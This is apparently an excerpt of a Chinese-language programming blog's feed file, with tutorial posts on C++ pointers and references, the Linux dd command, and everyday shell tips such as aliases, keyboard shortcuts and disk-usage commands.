&quot; &lt;&lt; col &lt;&lt; &#39;\n&#39;              &lt;&lt; &quot;a = &quot;   &lt;&lt; a   &lt;&lt; &#39;\n&#39;              &lt;&lt; &quot;f = &quot;   &lt;&lt; f   &lt;&lt; &#39;\n&#39;;}</code></pre><p>输出：<br>col = red<br>a = l<br>f = 3</p>]]></content>
      
      
      <categories>
          
          <category> C++ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>指针</title>
      <link href="/2024/07/30/twenty/"/>
      <url>/2024/07/30/twenty/</url>
      
        <content type="html"><![CDATA[<p>声明指针或指向成员指针类型的变量。</p><h1 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h1><p>指针的声明是简单声明，其声明符拥有下列形式</p><pre><code>* attr(可选) cv(可选) 声明符     (1)</code></pre><p>嵌套名说明符 * attr(可选) cv(可选) 声明符     (2)</p><pre><code>1) 指针声明符：声明 S* D; 将 D 声明为指向 嵌套名说明符 S 所确定类型的指针。2) 成员指针声明符：声明 S C::* D; 将 D 声明为指向 C 的 嵌套名说明符 S 所确定类型的非静态数据成员的指针。</code></pre><p>声明符     -     除引用声明符之外的任意声明符（无指向引用的指针）。它可以是另一指针声明符（允许指向指针的指针）,<br>attr(C++11)     -     属性的可选列表, cv     -     应用到被声明指针的 const/volatile 限定（而并非被指向类型，其限定是 声明说明符序列 的一部分）,<br>嵌套名说明符     -     名字和作用域解析运算符 :: 的序列,无指向引用的指针，无指向位域的指针。当没有详述地提及“指针”时，通常不包含指向（非静态）成员的指针。</p><h1 id="指针"><a href="#指针" class="headerlink" title="指针"></a>指针</h1><p>指针类型的值是下列之一：<br>    • 指向对象或函数的指针（该情况下说该指针指向函数或对象）<br>    • 对象末尾后指针，<br>    • 该类型的空指针值，<br>    • 无效指针值。<br>指向对象的指针表示其地址，为内存中对象所占用的首字节的地址。对象的末尾后指针亦表示地址，为内存中对象所占用的存储之后的首个字节的地址。注意，两个表示同一地址的指针可能拥有不同的值。</p><pre><code>struct C {   int x, y;} c;int* px = &amp;c.x;   // px 的值为“指向 c.x 的指针”int* pxe = px + 1; // pxe 的值为“ c.x 的尾后指针”int* py = &amp;c.y;   // py 的值为“指向 c.y 的指针”assert(pxe == py); // == 测试两个指针是否表示相同地址                   // 可能或可能不引发断言*pxe = 1; // 即使未引发断言，亦为未定义行为</code></pre><p>通过无效指针值间接寻址，和将无效指针值传递给解分配函数均拥有未定义行为。无效指针值的任何其他用法拥有由实现定义的行为。</p><h1 id="对象指针"><a href="#对象指针" class="headerlink" title="对象指针"></a>对象指针</h1><p>对象指针，能以应用于任何对象类型（包含另一指针类型）的表达式的取址运算符的返回值初始化：</p><pre><code>int n;int* np = &amp;n; // int 的指针int* const* npp = &amp;np; // 非 const int 的 const 指针的非 const 指针int a[2];int (*ap)[2] = &amp;a; // int 的数组的指针struct S { int n; };S s = {1};int* sp = &amp;s.n; // 指向作为 s 的成员的 int 的指针</code></pre><p>指针可作为内建间接寻址运算符（一元 operator*）的操作数，返回指代被指向对象的左值表达式：</p><pre><code>int n;int* p = &amp;n;     // 指向 n 的指针int&amp; r = *p;     // 绑定到指代 n 的左值表达式的引用r = 7;           // 存储 int 7 于 nstd::cout &lt;&lt; *p; // 左值到右值隐式转换从 n 读取值</code></pre><p>指向类对象的指针亦可作为成员访问运算符 <code>operator-&gt;</code>和 <code>operator-&gt;*</code>的左侧操作数。由于数组到指针隐式转换的原因，可以以数组类型的表达式初始化指向数组首元素的指针：</p><pre><code>int a[2];int* p1 = a; // 指向数组 a 首元素 a[0]（一个 int）的指针int b[6][3][8];int (*p2)[3][8] = b; // 指向数组 b 首元素 b[0] 的指针，                     // 被指者为 int 的 8 元素数组的 3 元素数组</code></pre><p>由于指针的派生类到基类隐式转换的原因，可以以派生类的地址初始化指向基类的指针：(使用基类的指针指向派生对象的地址)</p><pre><code>struct Base {};struct Derived : Base {};Derived d;Base* p = &amp;d;</code></pre><p>若 Derived 是多态的，则这种指针可用于进行虚函数调用。某些加法、减法、自增和自减运算符对于指向数组元素的指针有定义：这种指针满足旧式随机访问迭代器(LegacyRandomAccessIterator) 要求，并允许 C++ 库算法工作于原始数组上。某些情况下，<br>比较运算符对指针有定义：两个表示相同地址的指针比较相等，两个空指针值比较相等，指向同一数组中的元素的指针的比较与各元素的数组下标的比较方式相同，而指向拥有相同成员访问的非静态数据成员的指针以各成员的声明顺序进行比较。多数实现亦为随机来源的指针提供严格全序，<br>例如将它们实现为连续虚拟地址空间中的地址。未能做到的实现（例如，其中并非指针的所有位都是内存地址的一部分因而在比较时必须忽略之，或者要求附带的计算，或者指针与整数并非一对一关系），为指针提供了具有此项保证的 std::less 特化。<br>这使得可在关联容器（如 std::set 或 std::map）中使用所有随机来源的指针。</p><h1 id="void-的指针"><a href="#void-的指针" class="headerlink" title="void 的指针"></a>void 的指针</h1><p>指向任意类型对象的指针，可隐式转换成指向 void 的指针（可选地有 cv 限定）；不改变其值。逆向的转换要求 static_cast 或显式转型，生成其原指针值：</p><pre><code>int n = 1;int* p1 = &amp;n;void* pv = p1;int* p2 = static_cast&lt;int*&gt;(pv);std::cout &lt;&lt; *p2 &lt;&lt; &#39;\n&#39;; // 打印 1</code></pre><p>若原指针指向某多态类型对象中的基类子对象，则可用 dynamic_cast 获得指向最终派生类型的完整对象的 void<em>。void 指针用于传递未知类型对象，这在 C 接口中常见：std::malloc 返回 void</em>，<br>std::qsort 期待接受两个 const void<em> 参数的用户提供回调。pthread_create 期待接受并返回 void</em> 的用户提供的回调。所有情况下，调用方负责在使用前将指针转型到正确类型。</p><h1 id="函数指针"><a href="#函数指针" class="headerlink" title="函数指针"></a>函数指针</h1><p>函数指针能以非成员函数或静态成员函数的地址初始化。由于函数到指针隐式转换的原因，取址运算符是可选的：</p><pre><code>void f(int);void (*p1)(int) = &amp;f;void (*p2)(int) = f; // 与 &amp;f 相同</code></pre><p>不同于函数或函数的引用，函数指针是对象，从而能存储于数组、被复制、被赋值等。函数指针可用作函数调用运算符的左侧操作数，这会调用被指向的函数：</p><pre><code>int f(int n){    std::cout &lt;&lt; n &lt;&lt; &#39;\n&#39;;    return n * n;}int main(){    int (*p)(int) = f;    int x = p(7);}</code></pre><p>解引用函数指针生成标识被指向函数的左值：</p><pre><code>int f();int (*p)() = f;  // 指针 p 指向 fint (&amp;r)() = *p; // 将标识 f 的左值绑定到引用r();             // 通过左值引用调用函数 f(*p)();          // 通过函数左值调用函数 fp();             // 直接通过指针调用函数 f</code></pre><p>若只有一个重载匹配指针类型的话，函数指针可以从可包含函数、函数模板特化及函数模板的一个重载集进行初始化（细节见重载函数的地址）：</p><pre><code>template&lt;typename T&gt; T f(T n) { return n; }double f(double n) { return n; }int main(){    int (*p)(int) = f; // 实例化并选择 f&lt;int&gt;}</code></pre><p>相等比较运算符对于函数指针有定义（若指向同一函数则它们比较相等）。<br>    • 成员指针<br>    • 数据成员指针<br>指向作为类 C 的成员的非静态数据成员 m 的指针，能准确地以表达式 &amp;C::m 初始化。在 C 的成员函数中，如 &amp;(C::m) 或 &amp;m 这样的表达式不构成指向成员指针。这种指针能用作成员指针访问运算符 operator.<em> 与 operator-&gt;</em> 的右侧操作数：</p><pre><code>struct C { int m; };int main(){    int C::*p = &amp;C::m;          // 指向类 C 的数据成员 m    C c = {7};    std::cout &lt;&lt; c.*p &lt;&lt; &#39;\n&#39;;   // 打印 7    C* cp = &amp;c;    cp-&gt;m = 10;    std::cout &lt;&lt; cp-&gt;*p &lt;&lt; &#39;\n&#39;; // 打印 10}</code></pre><p>指向可访问无歧义非虚基类的数据成员的指针，可以隐式转换成指向派生类的同一数据成员的指针：</p><pre><code>struct Base { int m; };struct Derived : Base {};int main(){    int Base::* bp = &amp;Base::m;    int Derived::* dp = bp;    Derived d;    d.m = 1;    std::cout &lt;&lt; d.*dp &lt;&lt; &#39; &#39; &lt;&lt; d.*bp &lt;&lt; &#39;\n&#39;; // 打印 1 1}</code></pre><p>相反方向的转换，即从指向派生类的数据成员的指针到指向无歧义非虚基类的数据成员的指针，允许由 static_cast 和显式转型来进行，即使基类并无该成员（但当用该指针访问时，最终派生类中有）亦可：</p><pre><code>struct Base {};struct Derived : Base { int m; };int main(){    int Derived::* dp = &amp;Derived::m;    int Base::* bp = static_cast&lt;int Base::*&gt;(dp);    Derived d;    d.m = 7;    std::cout &lt;&lt; d.*bp &lt;&lt; &#39;\n&#39;; // OK：打印 7    Base b;    std::cout &lt;&lt; b.*bp &lt;&lt; &#39;\n&#39;; // 未定义行为}</code></pre><p>成员指针的被指向类型也可以是成员指针自身：成员指针可为多级，而且在每级可以有不同的 cv 限定。亦允许指针和成员指针的混合多级组合：</p><pre><code>struct A{    int m;    // 指向非 const 成员的 const 指针    int A::* const p;};int main(){    // 指向数据成员的非 const 指针，该成员是指向非 const 成员的 const 指针    int A::* const A::* p1 = &amp;A::p;    const A a = {1, &amp;A::m};    std::cout &lt;&lt; a.*(a.*p1) &lt;&lt; &#39;\n&#39;; // 打印 1    // 指向 const 的成员指针的常规非 const 指针    int A::* const* p2 = &amp;a.p;    std::cout &lt;&lt; a.**p2 &lt;&lt; &#39;\n&#39;; // 打印 1}</code></pre><h1 id="成员函数指针"><a href="#成员函数指针" class="headerlink" title="成员函数指针"></a>成员函数指针</h1><p>指向作为类 C 的成员的非静态成员函数 f 的指针，可准确地以表达式 <code>&amp;C::f</code>初始化。在 C 的成员函数内，如 <code>&amp;(C::f)</code>或 &amp;f 这样的表达式不构成成员函数指针。这种指针可以用作成员指针访问运算符 <code>operator.*</code>与 <code>operator-&gt;*</code>的右操作数。结果表达式只能用作函数调用运算符的左侧操作数：</p><pre><code>struct C{    void f(int n) { std::cout &lt;&lt; n &lt;&lt; &#39;\n&#39;; }};int main(){    void (C::* p)(int) = &amp;C::f; // 指向类 C 的成员函数 f 的指针    C c;    (c.*p)(1);                  // 打印 1    C* cp = &amp;c;    (cp-&gt;*p)(2);                // 打印 2}</code></pre><p>指向基类的成员函数的指针可以隐式转换成指向派生类的同一成员函数的指针：</p><pre><code>struct Base{    void f(int n) { std::cout &lt;&lt; n &lt;&lt; &#39;\n&#39;; }};struct Derived : Base {};int main(){    void (Base::* bp)(int) = &amp;Base::f;    void (Derived::* dp)(int) = bp;    Derived d;    (d.*dp)(1);    (d.*bp)(2);}</code></pre><p>相反方向的转换，即从指向派生类的成员函数的指针到指向无歧义非虚基类的成员函数的指针，允许由 static_cast 与显式转型来进行，即使基类无该成员函数（但在用该指针进行访问时，最终派生类有）：</p><pre><code>struct Base {};struct Derived : Base{    void f(int n) { std::cout &lt;&lt; n &lt;&lt; &#39;\n&#39;; }};int main(){    void (Derived::* dp)(int) = &amp;Derived::f;    void (Base::* bp)(int) = static_cast&lt;void (Base::*)(int)&gt;(dp);    Derived d;    (d.*bp)(1); // OK：打印 1    Base b;    (b.*bp)(2); // 未定义行为}</code></pre><p>成员函数指针可用作回调或函数对象，通常在应用 std::mem_fn 或 std::bind 之后：</p><pre><code>#include &lt;iostream&gt;#include &lt;string&gt;#include &lt;algorithm&gt;#include &lt;functional&gt;int main(){    std::vector&lt;std::string&gt; v = {&quot;a&quot;, &quot;ab&quot;, &quot;abc&quot;};    std::vector&lt;std::size_t&gt; l;    transform(v.begin(), v.end(), std::back_inserter(l),              std::mem_fn(&amp;std::string::size));    for(std::size_t n : l)        std::cout &lt;&lt; n &lt;&lt; &#39; &#39;;}</code></pre><p>输出：<br>1 2 3</p><h1 id="空指针"><a href="#空指针" class="headerlink" title="空指针"></a>空指针</h1><p>每个类型的指针都拥有一个特殊值，称为该类型的空指针值（null pointer value）。值为空的指针不指向对象或函数（解引用空指针是未定义行为），并与所有亦为空值的同类型指针比较相等。为将指针初始化为空或赋空值给既存指针，可以使用空指针字面量 nullptr、空指针常量 NULL 或从整数值 0 的隐式转换。<br>零初始化和值初始化亦将指针初始化为其空值。空指针可用于指示对象不存在（例如 function::target()），或作为其他错误条件的指示器（例如 dynamic_cast）。通常，接受指针实参的函数始终需要检查值是否为空，并以不同方式处理该情况（例如，delete 表达式在传递空指针时不做任何事）。<br>    • 常量性<br>    • 若指针声明中 cv 在 <em> 之前出现，则它是 声明说明符序列 的一部分，并应用到被指向的对象。<br>    • 若指针声明中 cv 在 </em> 之后出现，则它是 声明符 的一部分，并应用到所声明的指针。<br>语法 含义</p><pre><code>const T* 指向 const 对象的指针T const* 指向 const 对象的指针T* const 指向对象的 const 指针const T* const 指向 const 对象的 const 指针T const* const 指向 const 对象的 const 指针// pc 是 const int 的非 const 指针// cpc 是 const int 的 const 指针// ppc 是 const int 的非 const 指针的非 const 指针const int ci = 10, *pc = &amp;ci, *const cpc = pc, **ppc;// p 是非 const int 的非 const 指针// cp 是非 const int 的 const 指针int i, *p, *const cp = &amp;i;i = ci;    // OK：复制 const int 值到非 const int*cp = ci;  // OK：能修改非 const int（为 const 指针所指向）pc++;      // OK：能修改非 const 指针（指向 const int）pc = cpc;  // OK：能修改非 const 指针（指向 const int）pc = p;    // OK：能修改非 const 指针（指向 const int）ppc = &amp;pc; // OK：const int 的指针的地址是 const int 的指针的指针ci = 1;    // 错误：不能修改 const intci++;      // 错误：不能修改 const int*pc = 2;   // 错误：不能修改被指向的 const intcp = &amp;ci;  // 错误：不能修改 const 指针（指向非 const int）cpc++;     // 错误：不能修改 const 指针（指向 const int）p = pc;    // 错误：非 const int 的指针不能指向 const intppc = &amp;p;  // 错误：const int 的指针的指针不能指向非 const int 的指针</code></pre><p>通常，从一个多级指针到另一个的隐式转换，遵循限定转换和指针比较运算符中所描述的规则。</p>]]></content>
      
      
      <categories>
          
          <category> C++ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C++ 引用</title>
      <link href="/2024/07/30/nineteen/"/>
      <url>/2024/07/30/nineteen/</url>
      
        <content type="html"><![CDATA[<p>声明具名变量为引用，即既存对象或函数的别名。<br>引用变量声明是声明符拥有下列形式的简单声明</p><pre><code>&amp; attr(可选) 声明符     (1)&amp;&amp; attr(可选) 声明符     (2)     (C++11 起)</code></pre><p>1) 左值引用声明符：声明 S&amp; D; 将 D 声明为到 声明说明符序列 所确定的类型 S 的左值引用。<br>2) 右值引用声明符：声明 S&amp;&amp; D; 将 D 声明为到 声明说明符序列 所确定的类型 S 的右值引用。<br>声明符     -     除引用声明符之外的任何其他声明符（不存在引用的引用）<br>attr(C++11)     -     可选的属性列表<br>引用必须被初始化为指代一个有效的对象或函数：见引用初始化。不存在 void 的引用，也不存在引用的引用。引用类型无法在顶层被cv限定；<br>声明中没有为此而设的语法，并且通过 typedef、decltype或模板类型实参所引入的限定性是被忽略的。<br>引用不是对象；它们不必占用存储，尽管若需要分配存储以实现所需语义（例如，引用类型的非静态数据成员通常会增加类的大小，量为存储内存地址所需），<br>则编译器会这么做。因为引用不是对象，故不存在引用的数组，不存在指向引用的指针，不存在引用的引用：</p><pre><code>int&amp; a[3]; // 错误int&amp;* p;   // 错误int&amp; &amp;r;   // 错误</code></pre><h1 id="引用坍缩-C-11-起"><a href="#引用坍缩-C-11-起" class="headerlink" title="引用坍缩    (C++11 起)"></a>引用坍缩    (C++11 起)</h1><p>容许通过模板或 typedef 中的类型操作构成引用的引用，这种情况下适用引用坍缩（reference coolapsing）规则：<br>右值引用的右值引用坍缩成右值引用，所有其他组合均坍缩成左值引用：</p><pre><code>typedef int&amp;  lref;typedef int&amp;&amp; rref;int n;lref&amp;  r1 = n; // r1 的类型是 int&amp;lref&amp;&amp; r2 = n; // r2 的类型是 int&amp;rref&amp;  r3 = n; // r3 的类型是 int&amp;rref&amp;&amp; r4 = 1; // r4 的类型是 int&amp;&amp;</code></pre><p>（这条规则，和将 T&amp;&amp; 用于函数模板时的模板实参推导的特殊规则一起，组成了使得 std::forward 可行的规则。）</p><h1 id="左值引用"><a href="#左值引用" class="headerlink" title="左值引用"></a>左值引用</h1><p>左值引用可用于建立既存对象的别名（可选地拥有不同的 cv 限定）：</p><pre><code>#include &lt;iostream&gt;#include &lt;string&gt;int main() {    std::string s = &quot;Ex&quot;;    std::string&amp; r1 = s;    const std::string&amp; r2 = s;    r1 += &quot;ample&quot;;           // 修改 s    //  r2 += &quot;!&quot;;               // 错误：不能通过到 const 的引用修改    std::cout &lt;&lt; r2 &lt;&lt; &#39;\n&#39;; // 打印 s，现在保有 &quot;Example&quot;}</code></pre><p>它们亦可用于在函数调用中实现按引用传递语义：</p><pre><code>#include &lt;iostream&gt;#include &lt;string&gt;void double_string(std::string&amp; s) {    s += s; // &#39;s&#39; 与 main() 的 &#39;str&#39; 是同一对象}int main() {    std::string str = &quot;Test&quot;;    double_string(str);    std::cout &lt;&lt; str &lt;&lt; &#39;\n&#39;;}</code></pre><p>当函数的返回值是左值引用时，函数调用表达式成为左值表达式：</p><pre><code>#include &lt;iostream&gt;#include &lt;string&gt;char&amp; char_number(std::string&amp; s, std::size_t n) {    return s.at(n); // string::at() 返回 char 的引用}int main() {    std::string str = &quot;Test&quot;;    char_number(str, 1) = &#39;a&#39;; // 函数调用是左值，可被赋值    std::cout &lt;&lt; str &lt;&lt; &#39;\n&#39;;}</code></pre><h1 id="右值引用-C-11-起"><a href="#右值引用-C-11-起" class="headerlink" title="右值引用    (C++11 起)"></a>右值引用    (C++11 起)</h1><p>右值引用可用于为临时对象延长生存期（注意，左值引用亦能延长临时对象生存期，但不能通过左值引用修改它们）：</p><pre><code>#include &lt;iostream&gt;#include &lt;string&gt;int main(){    std::string s1 = &quot;Test&quot;;    //  std::string&amp;&amp; r1 = s1;           // 错误：不能绑定到左值    const std::string&amp; r2 = s1 + s1; // okay：到 const 的左值引用延长生存期    //  r2 += &quot;Test&quot;;                    // 错误：不能通过到 const 的引用修改    std::string&amp;&amp; r3 = s1 + s1;      // okay：右值引用延长生存期    r3 += &quot;Test&quot;;                    // okay：能通过到非 const 的引用修改    std::cout &lt;&lt; r3 &lt;&lt; &#39;\n&#39;;}</code></pre><p>更重要的是，当函数同时具有右值引用和左值引用的重载时，右值引用重载绑定到右值（包含纯右值和亡值），<br>而左值引用重载绑定到左值：</p><pre><code>#include &lt;iostream&gt;#include &lt;utility&gt;void f(int&amp; x) {    std::cout &lt;&lt; &quot;lvalue reference overload f(&quot; &lt;&lt; x &lt;&lt; &quot;)\n&quot;;}void f(const int&amp; x) {    std::cout &lt;&lt; &quot;lvalue reference to const overload f(&quot; &lt;&lt; x &lt;&lt; &quot;)\n&quot;;}void f(int&amp;&amp; x) {    std::cout &lt;&lt; &quot;rvalue reference overload f(&quot; &lt;&lt; x &lt;&lt; &quot;)\n&quot;;}int main() {    int i = 1;    const int ci = 2;    f(i);  // 调用 f(int&amp;)    f(ci); // 调用 f(const int&amp;)    f(3);  // 调用 f(int&amp;&amp;)    // 若不提供 f(int&amp;&amp;) 重载则会调用 f(const int&amp;)    f(std::move(i)); // 调用 f(int&amp;&amp;)    // 右值引用变量在用于表达式时是左值    int&amp;&amp; x = 1;    f(x);            // calls f(int&amp; x)    f(std::move(x)); // calls f(int&amp;&amp; x)}</code></pre><p>这允许在适当时机自动选择移动构造函数、移动赋值运算符和其他具移动能力的函数（例如 std::vector::push_back()）。<br>因为右值引用能绑定到亡值，故它们能指代非临时对象：</p><pre><code>int i2 = 42;int&amp;&amp; rri = std::move(i2); // 直接绑定到 i2</code></pre><p>这使得可以将作用域中不再需要的对象移动出去：</p><pre><code>std::vector&lt;int&gt; v{1,2,3,4,5};std::vector&lt;int&gt; v2(std::move(v)); // 绑定右值引用到 vassert(v.empty());</code></pre><h1 id="转发引用-C-11-起"><a href="#转发引用-C-11-起" class="headerlink" title="转发引用    (C++11 起)"></a>转发引用    (C++11 起)</h1><p>转发引用是一种特殊的引用，它保持函数实参的值类别，使得能利用 std::forward 转发实参。转发引用是下列之一：</p><h2 id="函数模板的函数形参，其被声明为同一函数模板的类型模板形参的无-cv-限定的右值引用："><a href="#函数模板的函数形参，其被声明为同一函数模板的类型模板形参的无-cv-限定的右值引用：" class="headerlink" title="函数模板的函数形参，其被声明为同一函数模板的类型模板形参的无 cv 限定的右值引用："></a>函数模板的函数形参，其被声明为同一函数模板的类型模板形参的无 cv 限定的右值引用：</h2><pre><code>template&lt;class T&gt;int f(T&amp;&amp; x) {                    // x 是转发引用    return g(std::forward&lt;T&gt;(x)); // 从而能被转发}int main() {    int i;    f(i); // 实参是左值，调用 f&lt;int&amp;&gt;(int&amp;), std::forward&lt;int&amp;&gt;(x) 是左值    f(0); // 实参是右值，调用 f&lt;int&gt;(int&amp;&amp;), std::forward&lt;int&gt;(x) 是右值}template&lt;class T&gt;int g(const T&amp;&amp; x); // x 不是转发引用：const T 不是无 cv 限定的template&lt;class T&gt; struct A {    template&lt;class U&gt;    A(T&amp;&amp; x, U&amp;&amp; y, int* p); // x 不是转发引用：T 不是构造函数的类型模板形参                             // 但 y 是转发引用};</code></pre><h2 id="auto-amp-amp-，但当其从花括号包围的初始化器列表推导时则不是："><a href="#auto-amp-amp-，但当其从花括号包围的初始化器列表推导时则不是：" class="headerlink" title="auto&amp;&amp;，但当其从花括号包围的初始化器列表推导时则不是："></a>auto&amp;&amp;，但当其从花括号包围的初始化器列表推导时则不是：</h2><pre><code>auto&amp;&amp; vec = foo();       // foo() 可以是左值或右值，vec 是转发引用auto i = std::begin(vec); // 也可以(*i)++;                   // 也可以g(std::forward&lt;decltype(vec)&gt;(vec)); // 转发，保持值类别for (auto&amp;&amp; x: f()) {  // x 是转发引用；这是使用范围 for 循环的最安全方式}auto&amp;&amp; z = {1, 2, 3}; // *不是*转发引用（初始化器列表的特殊情形）</code></pre><p>参阅模板实参推导和 std::forward。</p><h1 id="悬垂引用"><a href="#悬垂引用" class="headerlink" title="悬垂引用"></a>悬垂引用</h1><p>尽管引用一旦初始化，就始终指代一个有效的对象或函数，但有可能创建一个程序，被指代对象的生存期结束，<br>但引用仍保持可访问（悬垂（dangling））。访问这种引用是未定义行为。 一个常见例子是返回自动变量的引用的函数：</p><pre><code>std::string&amp; f(){    std::string s = &quot;Example&quot;;    return s; // 退出 s 的作用域: // 调用其析构函数并解分配其存储}std::string&amp; r = f(); // 悬垂引用std::cout &lt;&lt; r;       // 未定义行为：从悬垂引用读取std::string s = f();  // 未定义行为：从悬垂引用复制初始化</code></pre><p>注意，右值引用和到 const 的左值引用能延长临时对象的生存期（参阅引用初始化中的规则和例外情况）。<br>若被指代对象被销毁（例如通过显式的析构函数调用），但存储尚未被解分配，则到生存期外的对象的引用仍能以有限的方式使用，<br>且当在同一存储中重新创建对象时也可以变为有效（细节见在生存期之外进行访问）。</p>]]></content>
      
      
      <categories>
          
          <category> C++ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux dd命令</title>
      <link href="/2024/07/30/eighteen/"/>
      <url>/2024/07/30/eighteen/</url>
      
        <content type="html"><![CDATA[<p>dd 命令用于复制文件并对原文件的内容进行转换和格式化处理<br>语法格式<br>dd [OPTIONS]…<br>选项说明</p><pre><code>if=文件名   #指定源文件。of=文件名   #指定目的文件。ibs=bytes  #指定一个块大小为bytes个字节obs=bytes  #指定一个块大小为bytes个字节bs=bytes   #同时设置读入/输出的块大小为bytes个字节cbs=bytes  #指定转换缓冲区大小skip=blocks   #从输入文件开头跳过blocks个块后再开始复制seek=blocks   #从输出文件开头跳过blocks个块后再开始复制count=blocks  #仅拷贝blocks个块，块大小等于ibs指定的字节数conv=&lt;关键字&gt;</code></pre><p>关键字可以有以下11种：<br>    conversion  #用指定的参数转换文件。<br>    ascii     #转换ebcdic为ascii<br>    ebcdic   #转换ascii为ebcdic<br>    ibm      #转换ascii为alternate ebcdic<br>    block    #把每一行转换为长度为cbs<br>    unblock  #使每一行的长度都为cbs<br>    lcase    #把大写字符转换为小写字符<br>    ucase    #把小写字符转换为大写字符<br>    swab     #交换输入的每对字节<br>    noerror  #出错时不停止<br>    notrunc  #不截短输出文件<br>    sync     #将每个输入块填充到ibs个字节<br>–help     #显示帮助信息<br>–version  #显示版本信息<br>应用举例</p><h1 id="创建-ISO-光盘映像。"><a href="#创建-ISO-光盘映像。" class="headerlink" title="创建 ISO 光盘映像。"></a>创建 ISO 光盘映像。</h1><pre><code>dd if=/dev/sr0 of=/cd/cdrom.iso bs=2048 conv=noerror,sync</code></pre><h1 id="创建-dev-sda-硬盘驱动器的-img-文件"><a href="#创建-dev-sda-硬盘驱动器的-img-文件" class="headerlink" title="创建 /dev/sda 硬盘驱动器的 img 文件"></a>创建 /dev/sda 硬盘驱动器的 img 文件</h1><pre><code>dd if=/dev/sda of=~/disk1.img</code></pre><h1 id="将内容从-if-drive-dev-sda-复制到-of-drive-dev-sdb："><a href="#将内容从-if-drive-dev-sda-复制到-of-drive-dev-sdb：" class="headerlink" title="将内容从 if= drive /dev/sda 复制到 of= drive /dev/sdb："></a>将内容从 if= drive /dev/sda 复制到 of= drive /dev/sdb：</h1><pre><code>dd if=/dev/sda of=/dev/sdb</code></pre><h1 id="创建一个文件，大小为100M"><a href="#创建一个文件，大小为100M" class="headerlink" title="创建一个文件，大小为100M"></a>创建一个文件，大小为100M</h1><pre><code>dd if=/dev/zero of=mingongge.txt bs=100M count=1</code></pre><p>1+0 records in<br>1+0 records out<br>104857600 bytes (1.0 MB) copied, 0.006107 seconds, 172 MB/s</p><pre><code>du -sh mingongge.txt</code></pre><p>100.1M    mingongge.txt</p><h1 id="生成随机字符串"><a href="#生成随机字符串" class="headerlink" title="生成随机字符串"></a>生成随机字符串</h1><pre><code>dd if=/dev/urandom bs=1 count=33|base64 -w 0</code></pre><p>33+0 records in<br>33+0 records out<br>33 bytes (33 B) copied, 0.000199534 s, 165 kB/s<br>XrjvbxfTkz97rBuTmP5Ahb6gWN6E/uPyXqi/CAgBkEZ8</p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux 技巧</title>
      <link href="/2024/07/29/seventeen/"/>
      <url>/2024/07/29/seventeen/</url>
      
        <content type="html"><![CDATA[<p>如果要谨慎使用 rm 命令，可以为它设置一个别名，在删除文件之前需要进行确认才能删除。有些系统管理员会默认使用这个别名，<br>对于这种情况，你可能需要看看下一个技巧。</p><pre><code>$ rm -i    &lt;== 请求确认</code></pre><p>你可以使用 unalias 命令以交互方式禁用别名。它不会更改别名的配置，而仅仅是暂时禁用，直到下次登录或重新设置了这一个别名才会重新生效。<br>$ unalias rm如果已经将 rm -i 默认设置为 rm 的别名，但你希望在删除文件之前不必进行确认，则可以将 unalias 命令放在一个启动文件（例如 ~/.bashrc）中。<br>如果你经常在只有 root 用户才能执行的命令前忘记使用 sudo，这里有两个方法可以解决。一是利用命令历史记录，<br>可以使用 sudo !!（使用 !! 来运行最近的命令，并在前面添加 sudo）来重复执行，二是设置一些附加了所需 sudo 的命令别名。</p><pre><code>$ alias update=’sudo apt update’</code></pre><p>有时命令行技巧并不仅仅是一个别名。毕竟，别名能帮你做的只有替换命令以及增加一些命令参数，节省了输入的时间。<br>但如果需要比别名更复杂功能，可以通过编写脚本、向 .bashrc 或其他启动文件添加函数来实现。<br>例如，下面这个函数会在创建一个目录后进入到这个目录下。在设置完毕后，执行 source .bashrc，<br>就可以使用 md temp 这样的命令来创建目录立即进入这个目录下。</p><pre><code>md () { mkdir -p &quot;$@&quot; &amp;&amp; cd &quot;$1&quot;; }</code></pre><p>这里有很多快捷键可以帮我们修正自己的命令。接下来使用光标二字代替光标的位置。</p><h1 id="删除从开头到光标处的命令文本"><a href="#删除从开头到光标处的命令文本" class="headerlink" title="删除从开头到光标处的命令文本"></a>删除从开头到光标处的命令文本</h1><p>ctrl + u，例如：$ cd /proc/tty;ls -al光标如果此时使用ctrl+u快捷键，那么该条命令都会被清除，而不需要长按backspace键。</p><h1 id="删除从光标到结尾处的命令文本"><a href="#删除从光标到结尾处的命令文本" class="headerlink" title="删除从光标到结尾处的命令文本"></a>删除从光标到结尾处的命令文本</h1><p>ctrl + k，例如：$ cd /proc/tty光标;ls -al如果此时使用ctrl + k快捷键，那么从光标开始处到结尾的命令文本将会被删除。<br>还有其他的操作，不再举例，例如：<br>ctrl + a:光标移动到命令开头<br>ctrl + e：光标移动到命令结尾<br>alt  f:光标向前移动一个单词<br>alt  b：光标向前移动一个单词<br>ctrl w：删除一个词（以空格隔开的字符串）<br>我们都知道history记录了执行的历史命令，而使用!＋历史命令前的数字，可快速执行历史命令。</p><h1 id="部分历史命令查看"><a href="#部分历史命令查看" class="headerlink" title="部分历史命令查看"></a>部分历史命令查看</h1><p>history会显示大量的历史命令，而fs -l只会显示部分。<br>$ tail -f filename.logtail -f 加文件名，可以实时显示日志文件内容。当然，使用less命令查看文件内容，并且使用shift+f键，也可达到类似的效果。<br>怎么知道当前磁盘是否满了呢？</p><pre><code>$ df -h/dev/sda14      4.6G   10M  4.4G   1% /tmp/dev/sda11      454M  366M   61M  86% /boot/dev/sda15       55G   18G   35G  35% /home/dev/sda1       256M   31M  226M  12% /boot/efitmpfs           786M   64K  786M   1% /run/user/1000</code></pre><p>使用df命令可以快速查看各挂载路径磁盘占用情况。</p><h1 id="当前目录各个子目录占用空间大小"><a href="#当前目录各个子目录占用空间大小" class="headerlink" title="当前目录各个子目录占用空间大小"></a>当前目录各个子目录占用空间大小</h1><p>如果你已经知道home目录占用空间较大了，你想知道home目录下各个目录占用情况：<br>这里指定了目录深度，否则的话，它会递归统计子目录占用空间大小，可自行尝试。</p><pre><code>$ free -h              total        used        free      shared  buff/cache   availableMem:           7.7G   